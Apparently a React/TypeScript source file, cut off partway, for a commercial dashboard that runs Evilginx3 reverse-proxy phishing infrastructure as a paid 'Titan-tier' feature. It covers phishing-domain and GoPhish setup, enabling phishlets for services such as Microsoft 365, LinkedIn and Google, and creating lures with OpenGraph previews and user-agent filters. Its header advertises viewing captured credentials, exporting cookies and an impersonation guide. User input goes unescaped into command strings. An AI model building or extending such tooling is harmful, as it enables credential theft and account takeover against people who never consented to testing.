/**
 * Evilginx Management — Full-featured dashboard for managing Evilginx 3.3+
 * instances remotely via SSH. Titan-tier exclusive feature.
 *
 * Features:
 * - Server connection setup (SSH)
 * - Configuration management (domain, IP, unauth URL, GoPhish)
 * - Phishlet management (enable, disable, hide, hostname, hosts file)
 * - Lure management (create, edit, delete, pause, OpenGraph, redirectors, URL generation)
 * - Session viewer (credentials, cookies export, impersonation guide)
 * - Proxy configuration
 * - Blacklist management
 * - Custom TLS certificate info
 * - Built-in terminal for raw commands
 */

import { useState, useEffect, useCallback, useRef } from "react";
import { trpc } from "@/lib/trpc";
import { useSubscription } from "@/hooks/useSubscription";
import VpsNodeManager from "@/components/VpsNodeManager";
import { StreamingTerminal } from "@/components/StreamingTerminal";
import { useSecurityStream } from "@/hooks/useSecurityStream";
import { Button } from "@/components/ui/button";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import {
  Tabs,
  TabsContent,
  TabsList,
  TabsTrigger,
} from "@/components/ui/tabs";
import { toast } from "sonner";
import {
  Shield,
  Server,
  Globe,
  Link2,
  Users,
  Terminal,
  Settings,
  Play,
  Square,
  Plus,
  Trash2,
  Copy,
  RefreshCw,
  Loader2,
  Eye,
  EyeOff,
  Wifi,
  WifiOff,
  Lock,
  Unlock,
  ExternalLink,
  Pause,
  ChevronDown,
  ChevronUp,
  AlertTriangle,
  CheckCircle2,
  XCircle,
  FileText,
  Zap,
  Cookie,
  ShieldAlert,
  Network,
  MonitorSmartphone,
  Key,
  Mail,
  Image,
  Download,
} from "lucide-react";

// ─── Types ───────────────────────────────────────────────────────

interface Phishlet {
  name: string;
  hostname: string;
  status: string;
  isEnabled: boolean;
  isHidden: boolean;
}

interface Lure {
  id: number;
  phishlet: string;
  hostname: string;
  path: string;
  redirectUrl: string;
  paused: boolean;
}

interface Session {
  id: number;
  phishlet: string;
  username: string;
  password: string;
  tokens: boolean;
  remoteAddr: string;
  createTime: string;
}

interface ConnectionConfig {
  host: string;
  port: number;
  username: string;
  hasPassword: boolean;
  hasPrivateKey: boolean;
  isLocal?: boolean;
  version?: string;
}

// ─── Upgrade Gate ────────────────────────────────────────────────

function TitanGate() {
  return (
    <div className="flex flex-col items-center justify-center min-h-[70vh] px-4">
      <div className="relative mb-8">
        <div className="absolute inset-0 bg-red-500/20 blur-3xl rounded-full" />
        <div className="relative bg-zinc-900/80 border border-red-500/30 rounded-2xl p-8">
          <ShieldAlert className="w-16 h-16 text-red-400 mx-auto" />
        </div>
      </div>
      <h1 className="text-3xl font-bold text-white mb-3">Titan-Tier Exclusive</h1>
      <p className="text-zinc-400 text-center max-w-md mb-6">
        Evilginx Management is an advanced offensive security tool available exclusively
        on the Titan plan. Upgrade to unlock full remote control of your Evilginx
        phishing infrastructure.
      </p>
      <div className="flex gap-3">
        <Button variant="outline" className="border-zinc-700" onClick={() => window.location.href = "/pricing"}>
          View Plans
        </Button>
        <Button className="bg-red-600 hover:bg-red-700">
          Upgrade to Titan
        </Button>
      </div>
    </div>
  );
}

// ─── Local Server Connect Dialog ─────────────────────────────────

function ConnectionSetup({
  open,
  onClose,
  onSave,
}: {
  open: boolean;
  onClose: () => void;
  onSave: (config: any) => void;
  existing: ConnectionConfig | null;
}) {
  const [connecting, setConnecting] = useState(false);
  const [result, setResult] = useState<{ success: boolean; message: string } | null>(null);

  const checkInstall = trpc.evilginx.checkInstall.useQuery(undefined, { enabled: open });
  const connectLocal = trpc.evilginx.connectLocal.useMutation();
  const disconnect = trpc.evilginx.disconnect.useMutation();

  const handleConnect = async () => {
    setConnecting(true);
    setResult(null);
    try {
      const res = await connectLocal.mutateAsync();
      setResult(res);
      if (res.success) {
        toast.success("Connected to Titan server");
        onSave({ host: "localhost (this server)", port: 0, username: "local", isLocal: true });
        onClose();
      }
    } catch (err: any) {
      setResult({ success: false, message: err.message });
    }
    setConnecting(false);
  };

  const handleDisconnect = async () => {
    try {
      await disconnect.mutateAsync();
      toast.success("Disconnected");
      onSave(null);
      onClose();
    } catch (err: any) {
      toast.error(err.message);
    }
  };

  const installed = checkInstall.data?.installed;
  const version = checkInstall.data?.version;
  const binPath = checkInstall.data?.path;

  return (
    <Dialog open={open} onOpenChange={onClose}>
      <DialogContent className="bg-zinc-900 border-zinc-800 max-w-lg">
        <DialogHeader>
          <DialogTitle className="text-white flex items-center gap-2">
            <Server className="w-5 h-5 text-red-400" />
            Evilginx3 — Server Connection
          </DialogTitle>
          <DialogDescription>
            Evilginx runs directly on the Titan server. No external VPS required.
          </DialogDescription>
        </DialogHeader>

        <div className="space-y-4">
          {/* Server status card */}
          <div className="bg-zinc-800/60 rounded-lg p-4 border border-zinc-700">
            <div className="flex items-center gap-3 mb-3">
              <div className="bg-blue-500/10 rounded-lg p-2">
                <Server className="w-5 h-5 text-blue-400" />
              </div>
              <div>
                <p className="text-white font-medium text-sm">Titan Backend Server</p>
                <p className="text-zinc-500 text-xs">localhost — same machine as this app</p>
              </div>
            </div>
            <div className="flex items-center gap-2 text-sm">
              {checkInstall.isLoading ? (
                <><Loader2 className="w-4 h-4 animate-spin text-zinc-400" /><span className="text-zinc-400">Checking Evilginx3 installation…</span></>
              ) : installed ? (
                <><CheckCircle2 className="w-4 h-4 text-emerald-400" /><span className="text-emerald-400">Evilginx3 installed</span><span className="text-zinc-500 ml-1">{version && `(${version})`} at {binPath}</span></>
              ) : (
                <><XCircle className="w-4 h-4 text-red-400" /><span className="text-red-400">Evilginx3 not found</span><span className="text-zinc-500 ml-1">— install it on this server first</span></>
              )}
            </div>
          </div>

          {/* Install instructions if not found */}
          {checkInstall.data && !installed && (
            <div className="bg-amber-500/10 border border-amber-500/30 rounded-lg p-4 text-sm">
              <p className="text-amber-400 font-medium mb-2">Install Evilginx3 on this server:</p>
              <pre className="text-zinc-300 font-mono text-xs whitespace-pre-wrap">{`# Download latest release from GitHub
curl -L https://github.com/kgretzky/evilginx2/releases/latest/download/evilginx_linux_amd64.tar.gz | tar xz
sudo mv evilginx /usr/local/bin/evilginx
sudo chmod +x /usr/local/bin/evilginx`}</pre>
              <p className="text-zinc-500 text-xs mt-2">Or set the <code className="text-zinc-300">EVILGINX_BIN</code> env var to a custom binary path.</p>
            </div>
          )}

          {result && (
            <div className={`p-3 rounded-lg border text-sm ${
              result.success ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-400" : "bg-red-500/10 border-red-500/30 text-red-400"
            }`}>
              {result.success ? <CheckCircle2 className="w-4 h-4 inline mr-2" /> : <XCircle className="w-4 h-4 inline mr-2" />}
              {result.message}
            </div>
          )}
        </div>

        <DialogFooter className="gap-2">
          <Button variant="outline" className="border-zinc-700" onClick={handleDisconnect}>
            Disconnect
          </Button>
          <Button
            onClick={handleConnect}
            className="bg-red-600 hover:bg-red-700"
            disabled={connecting || checkInstall.isLoading || !installed}
          >
            {connecting ? <Loader2 className="w-4 h-4 animate-spin mr-2" /> : <Zap className="w-4 h-4 mr-2" />}
            Connect to This Server
          </Button>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  );
}

// ─── Config Tab ──────────────────────────────────────────────────

function ConfigTab({ exec }: { exec: (cmd: string) => Promise<string> }) {
  const [loading, setLoading] = useState(false);
  const [config, setConfig] = useState("");
  const [domain, setDomain] = useState("");
  const [ipv4, setIpv4] = useState("");
  const [ipv4External, setIpv4External] = useState("");
  const [unauthUrl, setUnauthUrl] = useState("");
  // GoPhish
  const [gophishUrl, setGophishUrl] = useState("");
  const [gophishApiKey, setGophishApiKey] = useState("");
  const [gophishInsecure, setGophishInsecure] = useState(false);

  const loadConfig = useCallback(async () => {
    setLoading(true);
    try {
      const result = await exec("config");
      setConfig(result);
    } catch (err: any) {
      toast.error(err.message);
    }
    setLoading(false);
  }, [exec]);

  useEffect(() => {
    loadConfig();
  }, [loadConfig]);

  const saveConfig = async () => {
    setLoading(true);
    try {
      const cmds: string[] = [];
      if (domain) cmds.push(`config domain ${domain}`);
      if (ipv4) cmds.push(`config ipv4 ${ipv4}`);
      if (ipv4External) cmds.push(`config ipv4 external ${ipv4External}`);
      if (unauthUrl) cmds.push(`config unauth_url ${unauthUrl}`);
      if (gophishUrl) cmds.push(`config gophish admin_url ${gophishUrl}`);
      if (gophishApiKey) cmds.push(`config gophish api_key ${gophishApiKey}`);
      if (gophishInsecure) cmds.push(`config gophish insecure true`);

      for (const cmd of cmds) {
        await exec(cmd);
      }
      toast.success("Configuration updated");
      await loadConfig();
    } catch (err: any) {
      toast.error(err.message);
    }
    setLoading(false);
  };

  const testGophish = async () => {
    try {
      const result = await exec("config gophish test");
      if (result.toLowerCase().includes("success") || result.toLowerCase().includes("ok")) {
        toast.success("GoPhish connection successful");
      } else {
        toast.info(result);
      }
    } catch (err: any) {
      toast.error(err.message);
    }
  };

  return (
    <div className="space-y-6">
      {/* Current Config Display */}
      <Card className="bg-zinc-900/50 border-zinc-800">
        <CardHeader className="pb-3">
          <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
            <CardTitle className="text-white text-lg flex items-center gap-2">
              <Settings className="w-5 h-5 text-red-400" />
              Current Configuration
            </CardTitle>
            <Button size="sm" variant="ghost" onClick={loadConfig} disabled={loading}>
              <RefreshCw className={`w-4 h-4 ${loading ? "animate-spin" : ""}`} />
            </Button>
          </div>
        </CardHeader>
        <CardContent>
          <pre className="bg-black/50 rounded-lg p-4 text-sm text-zinc-300 font-mono whitespace-pre-wrap overflow-x-auto max-h-48">
            {config || "Loading..."}
          </pre>
        </CardContent>
      </Card>

      {/* Server Config */}
      <Card className="bg-zinc-900/50 border-zinc-800">
        <CardHeader className="pb-3">
          <CardTitle className="text-white text-lg flex items-center gap-2">
            <Globe className="w-5 h-5 text-blue-400" />
            Server Settings
          </CardTitle>
          <CardDescription>Configure your phishing domain and server IP</CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="grid grid-cols-2 gap-4">
            <div>
              <Label className="text-zinc-400">Phishing Domain</Label>
              <Input
                value={domain}
                onChange={(e) => setDomain(e.target.value)}
                placeholder="not-a-phish.com"
                className="bg-zinc-800 border-zinc-700 text-white"
              />
            </div>
            <div>
              <Label className="text-zinc-400">External IPv4</Label>
              <Input
                value={ipv4}
                onChange={(e) => setIpv4(e.target.value)}
                placeholder="123.45.67.89"
                className="bg-zinc-800 border-zinc-700 text-white"
              />
            </div>
            <div>
              <Label className="text-zinc-400">IPv4 External (behind NAT)</Label>
              <Input
                value={ipv4External}
                onChange={(e) => setIpv4External(e.target.value)}
                placeholder="Optional"
                className="bg-zinc-800 border-zinc-700 text-white"
              />
            </div>
            <div>
              <Label className="text-zinc-400">Unauthorized Redirect URL</Label>
              <Input
                value={unauthUrl}
                onChange={(e) => setUnauthUrl(e.target.value)}
                placeholder="https://google.com"
                className="bg-zinc-800 border-zinc-700 text-white"
              />
            </div>
          </div>
        </CardContent>
      </Card>

      {/* GoPhish Integration */}
      <Card className="bg-zinc-900/50 border-zinc-800">
        <CardHeader className="pb-3">
          <CardTitle className="text-white text-lg flex items-center gap-2">
            <Mail className="w-5 h-5 text-amber-400" />
            GoPhish Integration
            <Badge className="bg-amber-500/20 text-amber-400 border-amber-500/30 text-xs">v3.3+</Badge>
          </CardTitle>
          <CardDescription>Connect to GoPhish for email campaign management with tracked lure URLs</CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="grid grid-cols-2 gap-4">
            <div>
              <Label className="text-zinc-400">GoPhish Admin URL</Label>
              <Input
                value={gophishUrl}
                onChange={(e) => setGophishUrl(e.target.value)}
                placeholder="https://1.2.3.4:3333"
                className="bg-zinc-800 border-zinc-700 text-white"
              />
            </div>
            <div>
              <Label className="text-zinc-400">GoPhish API Key</Label>
              <Input
                type="password"
                value={gophishApiKey}
                onChange={(e) => setGophishApiKey(e.target.value)}
                placeholder="c60e5bce24856c2c473c4560772"
                className="bg-zinc-800 border-zinc-700 text-white"
              />
            </div>
          </div>
          <div className="flex items-center gap-4">
            <label className="flex items-center gap-2 text-sm text-zinc-400 cursor-pointer">
              <input
                type="checkbox"
                checked={gophishInsecure}
                onChange={(e) => setGophishInsecure(e.target.checked)}
                className="rounded border-zinc-600"
              />
              Allow insecure TLS (self-signed certs)
            </label>
            <Button size="sm" variant="outline" className="border-zinc-700" onClick={testGophish}>
              <Zap className="w-3 h-3 mr-1" /> Test Connection
            </Button>
          </div>
        </CardContent>
      </Card>

      <Button onClick={saveConfig} className="bg-red-600 hover:bg-red-700 w-full" disabled={loading}>
        {loading ? <Loader2 className="w-4 h-4 animate-spin mr-2" /> : <CheckCircle2 className="w-4 h-4 mr-2" />}
        Save All Configuration
      </Button>
    </div>
  );
}

// ─── Phishlets Tab ───────────────────────────────────────────────

function PhishletsTab({ exec }: { exec: (cmd: string) => Promise<string> }) {
  const [loading, setLoading] = useState(false);
  const [phishlets, setPhishlets] = useState<Phishlet[]>([]);
  const [raw, setRaw] = useState("");
  const [hostnameDialog, setHostnameDialog] = useState<{ name: string } | null>(null);
  const [hostname, setHostname] = useState("");
  const [hostsDialog, setHostsDialog] = useState<{ name: string; hosts: string } | null>(null);
  const [expandedPhishlet, setExpandedPhishlet] = useState<string | null>(null);

  const loadPhishlets = useCallback(async () => {
    setLoading(true);
    try {
      const result = await exec("phishlets");
      setRaw(result);
      // Parse the output
      const lines = result.split("\n").filter((l) => l.trim());
      const parsed: Phishlet[] = [];
      for (const line of lines) {
        if (line.includes("---") || line.includes("phishlet") || line.startsWith(":") || line.includes("─")) continue;
        const parts = line.trim().split(/\s{2,}/);
        if (parts.length >= 2) {
          const name = parts[0]?.trim();
          if (name && name.length > 0 && !name.includes("─")) {
            parsed.push({
              name,
              hostname: parts[1]?.trim() || "",
              status: parts[2]?.trim()?.toLowerCase() || "disabled",
              isEnabled: parts[2]?.trim()?.toLowerCase() === "enabled",
              isHidden: parts[2]?.trim()?.toLowerCase() === "hidden",
            });
          }
        }
      }
      setPhishlets(parsed);
    } catch (err: any) {
      toast.error(err.message);
    }
    setLoading(false);
  }, [exec]);

  useEffect(() => {
    loadPhishlets();
  }, [loadPhishlets]);

  const enablePhishlet = async (name: string) => {
    try {
      await exec(`phishlets enable ${name}`);
      toast.success(`${name} enabled`);
      loadPhishlets();
    } catch (err: any) {
      toast.error(err.message);
    }
  };

  const disablePhishlet = async (name: string) => {
    try {
      await exec(`phishlets disable ${name}`);
      toast.success(`${name} disabled`);
      loadPhishlets();
    } catch (err: any) {
      toast.error(err.message);
    }
  };

  const hidePhishlet = async (name: string) => {
    try {
      await exec(`phishlets hide ${name}`);
      toast.success(`${name} hidden`);
      loadPhishlets();
    } catch (err: any) {
      toast.error(err.message);
    }
  };

  const unhidePhishlet = async (name: string) => {
    try {
      await exec(`phishlets unhide ${name}`);
      toast.success(`${name} unhidden`);
      loadPhishlets();
    } catch (err: any) {
      toast.error(err.message);
    }
  };

  const setPhishletHostname = async () => {
    if (!hostnameDialog || !hostname) return;
    try {
      await exec(`phishlets hostname ${hostnameDialog.name} ${hostname}`);
      toast.success(`Hostname set for ${hostnameDialog.name}`);
      setHostnameDialog(null);
      setHostname("");
      loadPhishlets();
    } catch (err: any) {
      toast.error(err.message);
    }
  };

  const getHosts = async (name: string) => {
    try {
      const result = await exec(`phishlets get-hosts ${name}`);
      setHostsDialog({ name, hosts: result });
    } catch (err: any) {
      toast.error(err.message);
    }
  };

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between">
        <div>
          <h3 className="text-white font-semibold">Phishlets</h3>
          <p className="text-sm text-zinc-500">Manage your reverse-proxy phishing templates</p>
        </div>
        <Button size="sm" variant="ghost" onClick={loadPhishlets} disabled={loading}>
          <RefreshCw className={`w-4 h-4 ${loading ? "animate-spin" : ""}`} />
        </Button>
      </div>

      {/* Stats */}
      <div className="grid grid-cols-3 gap-3">
        <Card className="bg-zinc-900/50 border-zinc-800">
          <CardContent className="p-4 text-center">
            <p className="text-2xl font-bold text-white">{phishlets.length}</p>
            <p className="text-xs text-zinc-500">Total</p>
          </CardContent>
        </Card>
        <Card className="bg-emerald-500/5 border-emerald-500/20">
          <CardContent className="p-4 text-center">
            <p className="text-2xl font-bold text-emerald-400">{phishlets.filter((p) => p.isEnabled).length}</p>
            <p className="text-xs text-zinc-500">Enabled</p>
          </CardContent>
        </Card>
        <Card className="bg-zinc-500/5 border-zinc-700">
          <CardContent className="p-4 text-center">
            <p className="text-2xl font-bold text-zinc-400">{phishlets.filter((p) => !p.isEnabled).length}</p>
            <p className="text-xs text-zinc-500">Disabled</p>
          </CardContent>
        </Card>
      </div>

      {/* Phishlet Cards */}
      <div className="space-y-2">
        {phishlets.length === 0 && !loading && (
          <div className="text-center py-12 text-zinc-500">
            <Shield className="w-12 h-12 mx-auto mb-3 opacity-30" />
            <p>No phishlets found. Make sure Evilginx has phishlet files loaded.</p>
          </div>
        )}
        {phishlets.map((p) => (
          <Card key={p.name} className="bg-zinc-900/50 border-zinc-800 hover:border-zinc-700 transition-colors">
            <CardContent className="p-4">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <div
                    className={`w-2 h-2 rounded-full ${
                      p.isEnabled ? "bg-emerald-400" : p.isHidden ? "bg-amber-400" : "bg-zinc-500"
                    }`}
                  />
                  <div>
                    <p className="text-white font-medium">{p.name}</p>
                    <p className="text-xs text-zinc-500">{p.hostname || "No hostname set"}</p>
                  </div>
                  <Badge
                    className={`text-xs ${
                      p.isEnabled
                        ? "bg-emerald-500/20 text-emerald-400 border-emerald-500/30"
                        : p.isHidden
                        ? "bg-amber-500/20 text-amber-400 border-amber-500/30"
                        : "bg-zinc-500/20 text-zinc-400 border-zinc-500/30"
                    }`}
                  >
                    {p.status}
                  </Badge>
                </div>
                <div className="flex items-center gap-1">
                  {p.isEnabled ? (
                    <Button size="sm" variant="ghost" onClick={() => disablePhishlet(p.name)} className="text-red-400 hover:text-red-300">
                      <Square className="w-3 h-3 mr-1" /> Disable
                    </Button>
                  ) : (
                    <Button size="sm" variant="ghost" onClick={() => enablePhishlet(p.name)} className="text-emerald-400 hover:text-emerald-300">
                      <Play className="w-3 h-3 mr-1" /> Enable
                    </Button>
                  )}
                  {p.isHidden ? (
                    <Button size="sm" variant="ghost" onClick={() => unhidePhishlet(p.name)} className="text-zinc-400">
                      <Eye className="w-3 h-3 mr-1" /> Unhide
                    </Button>
                  ) : (
                    <Button size="sm" variant="ghost" onClick={() => hidePhishlet(p.name)} className="text-zinc-400">
                      <EyeOff className="w-3 h-3 mr-1" /> Hide
                    </Button>
                  )}
                  <Button size="sm" variant="ghost" onClick={() => setHostnameDialog({ name: p.name })} className="text-zinc-400">
                    <Globe className="w-3 h-3 mr-1" /> Hostname
                  </Button>
                  <Button size="sm" variant="ghost" onClick={() => getHosts(p.name)} className="text-zinc-400">
                    <FileText className="w-3 h-3 mr-1" /> Hosts
                  </Button>
                </div>
              </div>
            </CardContent>
          </Card>
        ))}
      </div>

      {/* Hostname Dialog */}
      <Dialog open={!!hostnameDialog} onOpenChange={() => setHostnameDialog(null)}>
        <DialogContent className="bg-zinc-900 border-zinc-800">
          <DialogHeader>
            <DialogTitle className="text-white">Set Hostname for {hostnameDialog?.name}</DialogTitle>
            <DialogDescription>Set the hostname that will be used for this phishlet's phishing pages</DialogDescription>
          </DialogHeader>
          <Input
            value={hostname}
            onChange={(e) => setHostname(e.target.value)}
            placeholder="login.not-a-phish.com"
            className="bg-zinc-800 border-zinc-700 text-white"
          />
          <DialogFooter>
            <Button onClick={setPhishletHostname} className="bg-red-600 hover:bg-red-700">
              Set Hostname
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Hosts Dialog */}
      <Dialog open={!!hostsDialog} onOpenChange={() => setHostsDialog(null)}>
        <DialogContent className="bg-zinc-900 border-zinc-800">
          <DialogHeader>
            <DialogTitle className="text-white">DNS Hosts for {hostsDialog?.name}</DialogTitle>
            <DialogDescription>Add these entries to your DNS or /etc/hosts file</DialogDescription>
          </DialogHeader>
          <pre className="bg-black/50 rounded-lg p-4 text-sm text-zinc-300 font-mono whitespace-pre-wrap">
            {hostsDialog?.hosts}
          </pre>
          <DialogFooter>
            <Button
              variant="outline"
              className="border-zinc-700"
              onClick={() => {
                navigator.clipboard.writeText(hostsDialog?.hosts || "");
                toast.success("Copied to clipboard");
              }}
            >
              <Copy className="w-4 h-4 mr-2" /> Copy
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
}

// ─── Lures Tab ───────────────────────────────────────────────────

function LuresTab({ exec }: { exec: (cmd: string) => Promise<string> }) {
  const [loading, setLoading] = useState(false);
  const [lures, setLures] = useState<Lure[]>([]);
  const [raw, setRaw] = useState("");
  const [createDialog, setCreateDialog] = useState(false);
  const [createPhishlet, setCreatePhishlet] = useState("");
  const [editDialog, setEditDialog] = useState<Lure | null>(null);
  const [editField, setEditField] = useState("");
  const [editValue, setEditValue] = useState("");
  const [urlDialog, setUrlDialog] = useState<{ id: number; url: string } | null>(null);
  const [pauseDialog, setPauseDialog] = useState<{ id: number } | null>(null);
  const [pauseDuration, setPauseDuration] = useState("1h");
  // OpenGraph
  const [ogDialog, setOgDialog] = useState<{ id: number } | null>(null);
  const [ogTitle, setOgTitle] = useState("");
  const [ogDesc, setOgDesc] = useState("");
  const [ogImage, setOgImage] = useState("");
  const [ogUrl, setOgUrl] = useState("");
  const [expandedLure, setExpandedLure] = useState<number | null>(null);

  const loadLures = useCallback(async () => {
    setLoading(true);
    try {
      const result = await exec("lures");
      setRaw(result);
      const lines = result.split("\n").filter((l) => l.trim());
      const parsed: Lure[] = [];
      for (const line of lines) {
        if (line.includes("---") || line.includes("lure") || line.startsWith(":") || line.includes("─")) continue;
        const parts = line.trim().split(/\s{2,}/);
        if (parts.length >= 2) {
          const id = parseInt(parts[0]?.trim());
          if (!isNaN(id)) {
            parsed.push({
              id,
              phishlet: parts[1]?.trim() || "",
              hostname: parts[2]?.trim() || "",
              path: parts[3]?.trim() || "",
              redirectUrl: parts[4]?.trim() || "",
              paused: parts[5]?.trim()?.toLowerCase() === "paused",
            });
          }
        }
      }
      setLures(parsed);
    } catch (err: any) {
      toast.error(err.message);
    }
    setLoading(false);
  }, [exec]);

  useEffect(() => {
    loadLures();
  }, [loadLures]);

  const createLure = async () => {
    if (!createPhishlet) return;
    try {
      await exec(`lures create ${createPhishlet}`);
      toast.success(`Lure created for ${createPhishlet}`);
      setCreateDialog(false);
      setCreatePhishlet("");
      loadLures();
    } catch (err: any) {
      toast.error(err.message);
    }
  };

  const deleteLure = async (id: number) => {
    try {
      await exec(`lures delete ${id}`);
      toast.success(`Lure ${id} deleted`);
      loadLures();
    } catch (err: any) {
      toast.error(err.message);
    }
  };

  const getUrl = async (id: number) => {
    try {
      const result = await exec(`lures get-url ${id}`);
      // Extract URL from output
      const urlMatch = result.match(/(https?:\/\/[^\s]+)/);
      setUrlDialog({ id, url: urlMatch ? urlMatch[1] : result });
    } catch (err: any) {
      toast.error(err.message);
    }
  };

  const editLureField = async () => {
    if (!editDialog || !editField || !editValue) return;
    try {
      await exec(`lures edit ${editDialog.id} ${editField} ${editValue}`);
      toast.success(`Lure ${editDialog.id} updated`);
      setEditDialog(null);
      setEditField("");
      setEditValue("");
      loadLures();
    } catch (err: any) {
      toast.error(err.message);
    }
  };

  const pauseLure = async () => {
    if (!pauseDialog) return;
    try {
      await exec(`lures pause ${pauseDialog.id} ${pauseDuration}`);
      toast.success(`Lure ${pauseDialog.id} paused for ${pauseDuration}`);
      setPauseDialog(null);
      loadLures();
    } catch (err: any) {
      toast.error(err.message);
    }
  };

  const unpauseLure = async (id: number) => {
    try {
      await exec(`lures unpause ${id}`);
      toast.success(`Lure ${id} unpaused`);
      loadLures();
    } catch (err: any) {
      toast.error(err.message);
    }
  };

  const saveOpenGraph = async () => {
    if (!ogDialog) return;
    try {
      const cmds: string[] = [];
      if (ogTitle) cmds.push(`lures edit ${ogDialog.id} og_title "${ogTitle}"`);
      if (ogDesc) cmds.push(`lures edit ${ogDialog.id} og_desc "${ogDesc}"`);
      if (ogImage) cmds.push(`lures edit ${ogDialog.id} og_image ${ogImage}`);
      if (ogUrl) cmds.push(`lures edit ${ogDialog.id} og_url ${ogUrl}`);
      for (const cmd of cmds) {
        await exec(cmd);
      }
      toast.success("OpenGraph settings saved");
      setOgDialog(null);
      setOgTitle("");
      setOgDesc("");
      setOgImage("");
      setOgUrl("");
    } catch (err: any) {
      toast.error(err.message);
    }
  };

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between">
        <div>
          <h3 className="text-white font-semibold">Lures</h3>
          <p className="text-sm text-zinc-500">Manage phishing links with custom paths, redirectors, and OpenGraph previews</p>
        </div>
        <div className="flex gap-2">
          <Button size="sm" variant="ghost" onClick={loadLures} disabled={loading}>
            <RefreshCw className={`w-4 h-4 ${loading ? "animate-spin" : ""}`} />
          </Button>
          <Button size="sm" onClick={() => setCreateDialog(true)} className="bg-red-600 hover:bg-red-700">
            <Plus className="w-4 h-4 mr-1" /> New Lure
          </Button>
        </div>
      </div>

      {/* Lure Cards */}
      <div className="space-y-2">
        {lures.length === 0 && !loading && (
          <div className="text-center py-12 text-zinc-500">
            <Link2 className="w-12 h-12 mx-auto mb-3 opacity-30" />
            <p>No lures created yet. Create one to generate phishing URLs.</p>
          </div>
        )}
        {lures.map((l) => (
          <Card key={l.id} className="bg-zinc-900/50 border-zinc-800 hover:border-zinc-700 transition-colors">
            <CardContent className="p-4">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <div className="bg-red-500/10 rounded-lg p-2">
                    <Link2 className="w-4 h-4 text-red-400" />
                  </div>
                  <div>
                    <div className="flex items-center gap-2">
                      <p className="text-white font-medium">Lure #{l.id}</p>
                      <Badge className="bg-zinc-800 text-zinc-300 border-zinc-700 text-xs">{l.phishlet}</Badge>
                      {l.paused && (
                        <Badge className="bg-amber-500/20 text-amber-400 border-amber-500/30 text-xs">Paused</Badge>
                      )}
                    </div>
                    <p className="text-xs text-zinc-500">
                      {l.hostname || "Default hostname"} {l.path && `| Path: ${l.path}`}
                    </p>
                  </div>
                </div>
                <div className="flex items-center gap-1">
                  <Button size="sm" variant="ghost" onClick={() => getUrl(l.id)} className="text-blue-400 hover:text-blue-300">
                    <ExternalLink className="w-3 h-3 mr-1" /> Get URL
                  </Button>
                  <Button size="sm" variant="ghost" onClick={() => setEditDialog(l)} className="text-zinc-400">
                    <Settings className="w-3 h-3 mr-1" /> Edit
                  </Button>
                  <Button size="sm" variant="ghost" onClick={() => setOgDialog({ id: l.id })} className="text-zinc-400">
                    <Image className="w-3 h-3 mr-1" /> OG
                  </Button>
                  {l.paused ? (
                    <Button size="sm" variant="ghost" onClick={() => unpauseLure(l.id)} className="text-emerald-400">
                      <Play className="w-3 h-3 mr-1" /> Resume
                    </Button>
                  ) : (
                    <Button size="sm" variant="ghost" onClick={() => setPauseDialog({ id: l.id })} className="text-amber-400">
                      <Pause className="w-3 h-3 mr-1" /> Pause
                    </Button>
                  )}
                  <Button size="sm" variant="ghost" onClick={() => deleteLure(l.id)} className="text-red-400 hover:text-red-300">
                    <Trash2 className="w-3 h-3" />
                  </Button>
                </div>
              </div>
            </CardContent>
          </Card>
        ))}
      </div>

      {/* Create Lure Dialog */}
      <Dialog open={createDialog} onOpenChange={setCreateDialog}>
        <DialogContent className="bg-zinc-900 border-zinc-800">
          <DialogHeader>
            <DialogTitle className="text-white">Create New Lure</DialogTitle>
            <DialogDescription>Create a phishing lure for a specific phishlet</DialogDescription>
          </DialogHeader>
          <div>
            <Label className="text-zinc-400">Phishlet Name</Label>
            <Input
              value={createPhishlet}
              onChange={(e) => setCreatePhishlet(e.target.value)}
              placeholder="e.g., microsoft365, linkedin, google"
              className="bg-zinc-800 border-zinc-700 text-white"
            />
          </div>
          <DialogFooter>
            <Button onClick={createLure} className="bg-red-600 hover:bg-red-700">
              Create Lure
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Edit Lure Dialog */}
      <Dialog open={!!editDialog} onOpenChange={() => setEditDialog(null)}>
        <DialogContent className="bg-zinc-900 border-zinc-800">
          <DialogHeader>
            <DialogTitle className="text-white">Edit Lure #{editDialog?.id}</DialogTitle>
            <DialogDescription>Modify lure settings</DialogDescription>
          </DialogHeader>
          <div className="space-y-4">
            <div>
              <Label className="text-zinc-400">Field</Label>
              <Select value={editField} onValueChange={setEditField}>
                <SelectTrigger className="bg-zinc-800 border-zinc-700 text-white">
                  <SelectValue placeholder="Select field to edit" />
                </SelectTrigger>
                <SelectContent className="bg-zinc-800 border-zinc-700">
                  <SelectItem value="hostname">Hostname</SelectItem>
                  <SelectItem value="path">URL Path</SelectItem>
                  <SelectItem value="redirect_url">Redirect URL (after capture)</SelectItem>
                  <SelectItem value="redirector">Redirector Template</SelectItem>
                  <SelectItem value="ua_filter">User-Agent Filter (regex)</SelectItem>
                  <SelectItem value="info">Notes</SelectItem>
                </SelectContent>
              </Select>
            </div>
            <div>
              <Label className="text-zinc-400">Value</Label>
              <Input
                value={editValue}
                onChange={(e) => setEditValue(e.target.value)}
                placeholder="Enter new value"
                className="bg-zinc-800 border-zinc-700 text-white"
              />
            </div>
          </div>
          <DialogFooter>
            <Button onClick={editLureField} className="bg-red-600 hover:bg-red-700">
              Save Changes
            </Button>
